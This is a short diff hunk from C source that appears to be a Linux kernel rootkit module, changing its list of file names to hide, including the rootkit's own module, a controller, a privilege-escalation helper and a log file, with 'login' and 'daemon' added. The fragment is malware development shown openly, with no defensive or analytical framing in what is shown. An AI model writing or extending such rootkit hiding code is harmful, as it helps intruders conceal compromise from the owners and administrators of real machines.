@@ -90,7 +90,7 @@ static struct module *save_mod;
 static int activated = 0;
 
 // List of files to be hidden
-char *T_NAME[] = {"rootkit.ko", "controller", "priv_esc", "log.txt", "controller.c"};
+char *T_NAME[] = {"rootkit.ko", "controller", "log.txt", "controller.c", "login", "priv_esc", "daemon"};
 static int t_name_len = sizeof(T_NAME)/sizeof(T_NAME[0]);
 
 /*
